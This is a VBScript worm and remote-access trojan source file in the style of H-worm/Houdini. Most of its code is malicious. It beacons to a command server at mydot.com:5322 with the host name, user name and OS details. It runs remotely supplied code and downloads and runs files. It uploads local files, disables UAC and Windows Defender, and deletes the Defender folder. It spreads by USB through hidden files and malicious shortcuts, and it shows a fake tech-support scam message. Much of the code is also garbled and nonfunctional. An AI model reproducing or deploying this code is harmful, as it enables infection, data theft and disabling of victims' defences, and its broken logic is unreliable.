On Error Resume Next
'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

host = "mydot.com"
port = 5322
installdir = "%appdata%" & "%temp%" & "%computername%" & ""
lnkfile = true
lnkfolder = true

if ucase(file.name) or ucase(folder.name) or ucase(drive.name) then
    dim blob, buffer
    blob = vbs
    vbs = buffer
end if

'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=

dim shellobj
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")

'=-=-=-=-= private var =-=-=-=-=-=-=-=-=-=-=-=

installname = wscript.scriptname
installfullname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  
    installdir = shellobj.expandenvironmentstrings("%temp%" & "%appdata%") & "\"
end if
spliter = "|>/\<|"
dig = installdir & folder
sleepvb = 10
dim response
dim cmd
dim param
info = ""
usbspreading = ""
startdate = ""
dim oneonce

'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
hwld()

while true
houdini
spr_install
spr_uninstall

dim cv
cv = split(response,spliter)

select case cv
    case "download-zip"
        download "wshsdkvbscript.zip","download"
    case "sitedownload-zipfile"
        sitedownload linkstager,"h-worm_houdini_vbs_rat_source_code"
        sitedownload link,"kjworm.vbs" & "wshrat.vbs"
    case "execute"
        cover = cmd (1)
        execute(cover)
    case "cable"
        post "cableport",port
        port = port & cable
    case "outdate"
        dim harm
        harm = replace(harm, cover, mid("xc",installdir,ucase(installname.name)))
    case "update"
        set mydot = fso.opentextfile(installname & installdir,2,false)
        mydot.write harm
        mydot.close
        shellobj.run "wscript.exe //b" & chr(34) & installname & installdir & chr(34)
    case "upload-wshrat"
        dim linkstager
        dim link
        linkstager = "https://github.com/marcsvll/malware-samples/blob/8f37d13d869c22bc20b15b71f5c97e494cbb67d2/vbs/wshrat.vbs#L4"
        upload (linkstager)
        link = "https://github.com/AhmetHan/h-worm_houdini/blob/master/h-worm_houdini_vbs_rat_source_code" & "https://github.com/CCrashBandicot/helpful/blob/336b2c95b482d6c9de7756109b2699c7cfd8545c/Kjworm.vbs#L4"
        upload (link)
    case "checkinternet"
        internetcable = cmd (1)
        wscript.echo(internetcable & info & oneonce)
    case "openlink"
        shellobj.run(linkstager)
        shellobj.run(link)
    case "msgbox"
        post "Unable To Open Code", "Please Call 1-888-WINDOWS-PC"
    case "unzip"
        if fso.fileexists(installdir & "wshsdkvbscrip.zip") then
            unzip installdir & "wshsdkvbscript.zip",nt_dotnet_framework
       end if       
    case "disable-uac"
        if installdir = installname Then
            set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
            oReg.SetDwordValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System","EnableLUA", 0
            oReg.SetDwordValue &H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System","ConsentPromptBehaviorAdmin", 0
            oReg.SetDwordValue &H80000002,"SOFTWARE\Policies\Microsoft\Windows Defender","DisableAntiSpyware", 1
            oReg.SetDwordValue &H80000002,"SOFTWARE\Policies\Microsoft\Windows Defender","DisableAntiMalware", 1
            oReg = nothing
            updatestatus("UAC+Disabled+(Reboot+Required)")
        end if
    case "process-name-taskmanager"
        process = array("wininit.exe", "svchost.exe", "Registry", "wscript.exe", "cscript.exe", "Regedit", "rundll32.exe")
        txt = "ProcessDot32.txt"
        set f = fso.createtextfile(txt,1,false)
        with f
            .writeline "found process:" & vbcrlf & vbcrlf & processname
            .close
        end with
    case "hide-folder"
        set windows = filesystemobj.getspecialfolder("c:\windows\")
        windows.attributes = windows.attributes or 2 ' 2 = hidden
    case "searchdrive"
        call searchdrive("c:")
        networkobj.findnetworkdrive "c:"
    case "search file"
        call searchfile("*.")
        filesystemobj.getfile(filename)
    case "message"
        updatestatus("We Will Disable UAC")
    case "porn download video"
        sitedownload "pornhub.com","porn.mp4"
end select

wscript.sleep(sleepvb)

wend

sub spr_install
    dim lnkobj
    dim filename
    dim foldername
    dim fileicon
    dim foldericon
    
    post "http",html
    for each drive in filesystemobj.drives
    
    if  drive.isready = true then
    if  drive.freespace  > 0 then
    if  drive.drivetype  = 1 then
        filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
        if  filesystemobj.fileexists (drive.path & "\" & installname)  then
            filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
        end if
        for each file in filesystemobj.getfolder( drive.path & "\" ).Files
            if not lnkfile then exit for
            if  instr (file.name,".") then
                if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
                    file.attributes = 2+4
                    if  ucase (file.name) <> ucase (installname) then
                        filename = split(file.name,".")
                        set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
                        lnkobj.windowstyle = 7
                        lnkobj.targetpath = "cmd.exe"
                        lnkobj.workingdirectory = ""
                        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
                        fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
                        if  instr (fileicon,",") = 0 then
                            lnkobj.iconlocation = file.path
                        else 
                            lnkobj.iconlocation = fileicon
                        end if
                        lnkobj.save()
                    end if
                end if
            end if
        next
        for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
            if not lnkfolder then exit for
            folder.attributes = 2+4
            foldername = folder.name
            set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
            lnkobj.windowstyle = 7
            lnkobj.targetpath = "cmd.exe"
            lnkobj.workingdirectory = ""
            lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
            foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
            if  instr (foldericon,",") = 0 then
                lnkobj.iconlocation = folder.path
            else 
                lnkobj.iconlocation = foldericon
            end if
            lnkobj.save()
        next
    end If
    end If
    end if
    next
    err.clear
end sub
 
sub spr_uninstall
    dim filename
    dim foldername
    
    shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
    shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
    filesystemobj.deletefile startup & installname ,true
    filesystemobj.deletefile wscript.scriptfullname ,true
    
    for  each drive in filesystemobj.drives
    if  drive.isready = true then
    if  drive.freespace  > 0 then
    if  drive.drivetype  = 1 then
        for  each file in filesystemobj.getfolder ( drive.path & "\").files
             on error resume next
             if  instr (file.name,".") then
                 if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
                     file.attributes = 0
                     if  ucase (file.name) <> ucase (installname) then
                         filename = split(file.name,".")
                         filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                     else
                         filesystemobj.deletefile (drive.path & "\" & file.name)
                     end If
                 else
                     filesystemobj.deletefile (file.path) 
                 end if
             end if
         next
         for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
             folder.attributes = 0
         next
    end if
    end if
    end if
    next
    wscript.quit
end sub

sub houdini
    cv = cv & spilter & getobject("winmgmts:\\.\root\cimv3").findinformation
end sub

function hwld()
    hwld = "w0rm-virus-houdini"
    if instr(key,">") then
        cv = hwld
    end if
end function

function unzip(zipfile, ExtractTo)
    if filesystemobj.GetExtensionName(zipfile) = "zip" then
		if not filesystemobj.FolderExists(ExtractTo) Then
			filesystemobj.CreateFolder(ExtractTo)
        end if
		set appshellobj = CreateObject("Shell.Application")
		set destination = appshellobj.NameSpace(ExtractTo)
		set zip_content = appshellobj.NameSpace(zipfile).Items   
		for i = 0 to zip_content.count - 1
			if (filesystemobj.FileExists(filesystemobj.Buildpath(ExtractTo,zip_content.item(i).name)+"."+filesystemobj.getExtensionName(zip_content.item(i).path))) then
				filesystemobj.DeleteFile(filesystemobj.Buildpath(ExtractTo,zip_content.item(i).name)+"."+filesystemobj.getExtensionName(zip_content.item(i).path))
			end if
			destination.copyHere zip_content.item(i), 20
		next 
	end if
end function

function updatestatus(status_msg)
    set objsoc = createobject("msxml2.xmlhttp")
	objsoc.open "post","http://" & host & ":" & port &"/" & "update-status" & spliter & status_msg, false
	objsoc.setrequestheader "user-agent:",information
	objsoc.send ""
end function

sub post(cmd, param)
    post = ""
    httpobj.open "post","http://" & host & ":" & port &"/" & param & spliter & cmd, false
	httpobj.setrequestheader "user-agent:",information
	httpobj.send
    post = httpobj.responsebody
end sub

sub information
    if  inf = "" then
        inf = hwid & spliter 
        inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
        inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter
    
        set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
        set os = root.execquery ("select * from win32_operatingsystem")
        for each osinfo in os
           inf = inf & osinfo.caption & spliter  
           exit for
        next
        inf = inf & "plus" & spliter
        inf = inf & security & spliter
        inf = inf & usbspreading
        information = inf  
    else
        information = inf
    end if
end sub

function sitedownload(fileurl,filedir)
    
strlink = fileurl
strsaveto = installdir & filename
set objhttpdownload = createobject("msxml2.xmlhttp" )
objhttpdownload.open "get", strlink, false
objhttpdownload.send

set objfsodownload = createobject ("scripting.filesystemobject")
if  objfsodownload.fileexists (strsaveto) then
    objfsodownload.deletefile (strsaveto)
end if
 
if objhttpdownload.status = 200 then
   dim  objstreamdownload
   set  objstreamdownload = createobject("adodb.stream")
   with objstreamdownload
		.type = 1 
		.open
		.write objhttpdownload.responsebody
		.savetofile strsaveto
		.close
   end with
   set objstreamdownload = nothing
end if
if objfsodownload.fileexists(strsaveto) then
   shellobj.run objfsodownload.getfile (strsaveto).shortpath
end if 
end function

function download(fileurl)
    
    dim  httpobj,objstreamuploade,buffer
    set  objstreamuploade = createobject("adodb.stream")
    with objstreamuploade 
        .type = 1 
        .open
	    .loadfromfile fileurl
	    buffer = .read
	    .close
    end with
    set objstreamdownload = nothing
    set httpobj = createobject("msxml2.xmlhttp")
    httpobj.open "post","http://" & host & ":" & port &"/" & "is-recving" & spliter & fileurl, false
    httpobj.send buffer
end function

sub searchdrive(strpath)
    if drive.driveType = 1 or drive.drivetype = 2 or drive.driveType = 3 Then
        networkobj.disconnectnetworkdrive "g:\"
    end if
end sub

sub searchfile(Dot)
    ext = lcase(filesystemobj.getextensionname(file.path))

    select case ext
        case "hta", "htm", "html", "asp", "vbs", "vbe", "txt"
             file.name = ext
        case "mpg", "rmvb", "avi", "rmp", "zip", "log"
            file.size = "360MB"
    end select
end sub

dim nt_dotnet_framework
nt_dotnet_framework = "NO"
if filesystemobj.folderexists("windir" & "\Microsoft.NET") then
    nt_dotnet_framework = "YES"
end if

if u = "" then
    if mid(installfullname,3,"code") = ":\" & installname then
        u = "TRUE"
        shellobj.regwrite g(2), u, g(2)
    else
        u = "FALSE"
        shellobj.regwrite r(2), u, r(2)
    end if
end if

dim newletter
newletter = chrw(cint(driveletter))
if filesystemobj.fileexists(newletter) = ":\" then
    filesystemobj.deletefile(":\" & newletter)
    filesystemobj.deletefile(":\" & filedir)
    filesystemobj.deletefile(":\" & drive.path)
end if

dim argsobj
set argsobj = wscript.arguments
argsobj = 9
dim frie
frie = replace(frie, argsobj, fileicon)
frie = replace(frie, "uac+disabled", argsobj & fileicon)
windowsantivirus = array("c:\program files (x86)\windows defender")
set wjn = filesystemobj.getfolder(windowsantivirus)
wjn.delete true
set wjn = nothing
frie = frie & windowsantivirus
